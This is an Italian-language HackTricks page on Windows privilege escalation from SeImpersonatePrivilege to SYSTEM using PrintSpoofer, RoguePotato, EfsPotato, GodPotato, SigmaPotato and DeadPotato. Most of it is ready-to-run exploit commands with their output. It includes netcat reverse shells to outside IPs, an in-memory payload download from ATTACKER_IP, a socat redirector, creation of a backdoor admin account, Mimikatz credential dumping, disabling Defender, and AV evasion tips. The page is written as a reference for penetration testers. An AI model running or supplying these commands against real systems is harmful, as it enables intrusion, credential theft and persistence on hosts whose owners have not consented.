# RoguePotato, PrintSpoofer, SharpEfsPotato, GodPotato

{{#include ../../banners/hacktricks-training.md}}

> [!WARNING]
> **JuicyPotato non funziona** su Windows Server 2019 e Windows 10 build 1809 e successivi. Tuttavia, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato)**,** [**GodPotato**](https://github.com/BeichenDream/GodPotato)**,** [**EfsPotato**](https://github.com/zcgonvh/EfsPotato)**,** [**DCOMPotato**](https://github.com/zcgonvh/DCOMPotato)** possono essere usati per **ottenere gli stessi privilegi e acquisire accesso a livello `NT AUTHORITY\SYSTEM`**. Questo [post sul blog](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/) approfondisce lo strumento `PrintSpoofer`, che può essere utilizzato per abusare dei privilegi di impersonificazione su host Windows 10 e Server 2019 dove JuicyPotato non funziona più.

> [!TIP]
> Un'alternativa moderna frequentemente mantenuta nel 2024–2025 è SigmaPotato (un fork di GodPotato) che aggiunge l'uso in-memory/.NET reflection e supporto OS esteso. Vedi l'uso rapido qui sotto e il repo nei Riferimenti.

Pagine correlate per contesto e tecniche manuali:

{{#ref}}
seimpersonate-from-high-to-system.md
{{#endref}}

{{#ref}}
from-high-integrity-to-system-with-name-pipes.md
{{#endref}}

{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

## Requisiti e problemi comuni

Tutte le tecniche qui sotto si basano sull'abuso di un servizio privilegiato in grado di impersonare, avviato da un contesto che possiede uno dei seguenti privilegi:

- SeImpersonatePrivilege (il più comune) o SeAssignPrimaryTokenPrivilege
- L'integrità elevata non è richiesta se il token ha già SeImpersonatePrivilege (tipico per molti account di servizio come IIS AppPool, MSSQL, ecc.)

Controlla rapidamente i privilegi:
```cmd
whoami /priv | findstr /i impersonate
```
Operational notes:

- Se la tua shell gira con un token ristretto senza SeImpersonatePrivilege (comune per Local Service/Network Service in alcuni contesti), recupera i privilegi predefiniti dell'account usando FullPowers, poi esegui una Potato. Esempio: `FullPowers.exe -c "cmd /c whoami /priv" -z`
- PrintSpoofer richiede che il servizio Print Spooler sia in esecuzione e raggiungibile tramite l'endpoint RPC locale (spoolss). In ambienti fortemente protetti dove Spooler è disabilitato dopo PrintNightmare, preferire RoguePotato/GodPotato/DCOMPotato/EfsPotato.
- RoguePotato richiede un OXID resolver raggiungibile su TCP/135. Se il traffico in uscita è bloccato, usa un redirector/port-forwarder (vedi esempio sotto). Le build più vecchie richiedevano il flag -f.
- EfsPotato/SharpEfsPotato abusano di MS-EFSR; se una pipe è bloccata, prova pipe alternative (lsarpc, efsrpc, samr, lsass, netlogon).
- L'errore 0x6d3 durante RpcBindingSetAuthInfo indica tipicamente un servizio di autenticazione RPC sconosciuto/non supportato; prova una pipe/trasporto diverso o assicurati che il servizio target sia in esecuzione.
- Fork "kitchen-sink" come DeadPotato includono moduli payload extra (Mimikatz/SharpHound/Defender off) che scrivono su disco; aspettati una rilevazione EDR più alta rispetto agli originali snelli.

## Demo rapida

### PrintSpoofer
```bash
c:\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd"

--------------------------------------------------------------------------------

[+] Found privilege: SeImpersonatePrivilege

[+] Named pipe listening...

[+] CreateProcessAsUser() OK

NULL

```
Note:
- Puoi usare -i per avviare un processo interattivo nella console corrente, o -c per eseguire un one-liner.
- Richiede il servizio Spooler. Se disabilitato, fallirà.

### RoguePotato
```bash
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -l 9999
# In some old versions you need to use the "-f" param
c:\RoguePotato.exe -r 10.10.10.10 -c "c:\tools\nc.exe 10.10.10.10 443 -e cmd" -f 9999
```
Se la porta 135 in uscita è bloccata, pivot the OXID resolver via socat sul tuo redirector:
```bash
# On attacker redirector (must listen on TCP/135 and forward to victim:9999)
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999

# On victim, run RoguePotato with local resolver on 9999 and -r pointing to the redirector IP
RoguePotato.exe -r REDIRECTOR_IP -e "cmd.exe /c whoami" -l 9999
```
### PrintNotifyPotato

PrintNotifyPotato è una nuova primitiva di abuso COM rilasciata alla fine del 2022 che prende di mira il servizio **PrintNotify** invece dello Spooler/BITS. Il binario istanzia il server COM PrintNotify, sostituisce un `IUnknown` falso, quindi innesca una callback privilegiata tramite `CreatePointerMoniker`. Quando il servizio PrintNotify (in esecuzione come **SYSTEM**) si riconnette, il processo duplica il token restituito e avvia il payload fornito con privilegi completi.

Key operational notes:

* Funziona su Windows 10/11 e Windows Server 2012–2022 purché il servizio Print Workflow/PrintNotify sia installato (è presente anche quando lo Spooler legacy è disabilitato dopo PrintNightmare).
* Richiede che il contesto chiamante possieda **SeImpersonatePrivilege** (tipico per account di servizio IIS APPPOOL, MSSQL e scheduled-task).
* Accetta sia un comando diretto sia una modalità interattiva così puoi rimanere nella console originale. Esempio:

```cmd
PrintNotifyPotato.exe cmd /c "powershell -ep bypass -File C:\ProgramData\stage.ps1"
PrintNotifyPotato.exe whoami
```

* Poiché è basato esclusivamente su COM, non sono necessari listener su named pipe o redirector esterni, rendendolo un sostituto drop-in sugli host dove Defender blocca il binding RPC di RoguePotato.

Operatori come Ink Dragon eseguono PrintNotifyPotato immediatamente dopo aver ottenuto RCE via ViewState su SharePoint per pivotare dal worker `w3wp.exe` a SYSTEM prima di installare ShadowPad.

### SharpEfsPotato
```bash
> SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe -a "whoami | Set-Content C:\temp\w.log"
SharpEfsPotato by @bugch3ck
Local privilege escalation from SeImpersonatePrivilege using EfsRpc.

Built from SweetPotato by @_EthicalChaos_ and SharpSystemTriggers/SharpEfsTrigger by @cube0x0.

[+] Triggering name pipe access on evil PIPE \\localhost/pipe/c56e1f1f-f91c-4435-85df-6e158f68acd2/\c56e1f1f-f91c-4435-85df-6e158f68acd2\c56e1f1f-f91c-4435-85df-6e158f68acd2
df1941c5-fe89-4e79-bf10-463657acf44d@ncalrpc:
[x]RpcBindingSetAuthInfo failed with status 0x6d3
[+] Server connected to our evil RPC pipe
[+] Duplicated impersonation token ready for process creation
[+] Intercepted and authenticated successfully, launching program
[+] Process created, enjoy!

C:\temp>type C:\temp\w.log
nt authority\system
```
### EfsPotato
```bash
> EfsPotato.exe "whoami"
Exploit for EfsPotato(MS-EFSR EfsRpcEncryptFileSrv with SeImpersonatePrivilege local privalege escalation vulnerability).
Part of GMH's fuck Tools, Code By zcgonvh.
CVE-2021-36942 patch bypass (EfsRpcEncryptFileSrv method) + alternative pipes support by Pablo Martinez (@xassiz) [www.blackarrow.net]

[+] Current user: NT Service\MSSQLSERVER
[+] Pipe: \pipe\lsarpc
[!] binding ok (handle=aeee30)
[+] Get Token: 888
[!] process with pid: 3696 created.
==============================
[x] EfsRpcEncryptFileSrv failed: 1818

nt authority\system
```
Suggerimento: se una pipe fallisce o EDR la blocca, prova le altre pipe supportate:
```text
EfsPotato <cmd> [pipe]
pipe -> lsarpc|efsrpc|samr|lsass|netlogon (default=lsarpc)
```
### GodPotato
```bash
> GodPotato -cmd "cmd /c whoami"
# You can achieve a reverse shell like this.
> GodPotato -cmd "nc -t -e C:\Windows\System32\cmd.exe 192.168.1.102 2012"
```
Note:
- Funziona su Windows 8/8.1–11 e Server 2012–2022 quando SeImpersonatePrivilege è presente.

### DCOMPotato

![image](https://github.com/user-attachments/assets/a3153095-e298-4a4b-ab23-b55513b60caa)

DCOMPotato fornisce due varianti che prendono di mira gli oggetti DCOM dei servizi che hanno come impostazione predefinita RPC_C_IMP_LEVEL_IMPERSONATE. Compila o usa i binari forniti ed esegui il tuo comando:
```cmd
# PrinterNotify variant
PrinterNotifyPotato.exe "cmd /c whoami"

# McpManagementService variant (Server 2022 also)
McpManagementPotato.exe "cmd /c whoami"
```
### SigmaPotato (fork di GodPotato aggiornato)

SigmaPotato aggiunge funzionalità moderne come esecuzione in memoria tramite .NET reflection e un helper PowerShell per reverse shell.
```powershell
# Load and execute from memory (no disk touch)
[System.Reflection.Assembly]::Load((New-Object System.Net.WebClient).DownloadData("http://ATTACKER_IP/SigmaPotato.exe"))
[SigmaPotato]::Main("cmd /c whoami")

# Or ask it to spawn a PS reverse shell
[SigmaPotato]::Main(@("--revshell","ATTACKER_IP","4444"))
```
Additional perks in 2024–2025 builds (v1.2.x):
- Built-in reverse shell flag `--revshell` and removal of the 1024-char PowerShell limit so you can fire long AMSI-bypassing payloads in one go.
- Reflection-friendly syntax (`[SigmaPotato]::Main()`), plus a rudimentary AV evasion trick via `VirtualAllocExNuma()` to throw off simple heuristics.
- Separate `SigmaPotatoCore.exe` compiled against .NET 2.0 for PowerShell Core environments.

### DeadPotato (2024 GodPotato rework with modules)

DeadPotato mantiene la catena di impersonazione GodPotato OXID/DCOM ma integra helper di post-exploitation in modo che gli operatori possano ottenere immediatamente SYSTEM ed eseguire persistence/collection senza tool aggiuntivi.

Common modules (all require SeImpersonatePrivilege):

- `-cmd "<cmd>"` — esegue un comando arbitrario come SYSTEM.
- `-rev <ip:port>` — quick reverse shell.
- `-newadmin user:pass` — crea un amministratore locale per persistence.
- `-mimi sam|lsa|all` — drop and run Mimikatz per dumpare credenziali (scrive su disco, rumoroso).
- `-sharphound` — esegue la raccolta SharpHound come SYSTEM.
- `-defender off` — disattiva la protezione in tempo reale di Defender (molto rumoroso).

Example one-liners:
```cmd
# Blind reverse shell
DeadPotato.exe -rev 10.10.14.7:4444

# Drop an admin for later login
DeadPotato.exe -newadmin pwned:P@ssw0rd!

# Run SharpHound immediately after priv-esc
DeadPotato.exe -sharphound
```
Poiché include binari aggiuntivi, aspettati più rilevamenti da AV/EDR; usa le versioni più snelle GodPotato/SigmaPotato quando la stealth è importante.

## Riferimenti

- [https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/](https://itm4n.github.io/printspoofer-abusing-impersonate-privileges/)
- [https://github.com/itm4n/PrintSpoofer](https://github.com/itm4n/PrintSpoofer)
- [https://github.com/antonioCoco/RoguePotato](https://github.com/antonioCoco/RoguePotato)
- [https://github.com/bugch3ck/SharpEfsPotato](https://github.com/bugch3ck/SharpEfsPotato)
- [https://github.com/BeichenDream/GodPotato](https://github.com/BeichenDream/GodPotato)
- [https://github.com/zcgonvh/EfsPotato](https://github.com/zcgonvh/EfsPotato)
- [https://github.com/zcgonvh/DCOMPotato](https://github.com/zcgonvh/DCOMPotato)
- [https://github.com/tylerdotrar/SigmaPotato](https://github.com/tylerdotrar/SigmaPotato)
- [https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/](https://decoder.cloud/2020/05/11/no-more-juicypotato-old-story-welcome-roguepotato/)
- [FullPowers – Restore default token privileges for service accounts](https://github.com/itm4n/FullPowers)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [BeichenDream/PrintNotifyPotato](https://github.com/BeichenDream/PrintNotifyPotato)
- [Check Point Research – Inside Ink Dragon: Revealing the Relay Network and Inner Workings of a Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [DeadPotato – GodPotato rework with built-in post-ex modules](https://github.com/lypd0/DeadPotato)

{{#include ../../banners/hacktricks-training.md}}
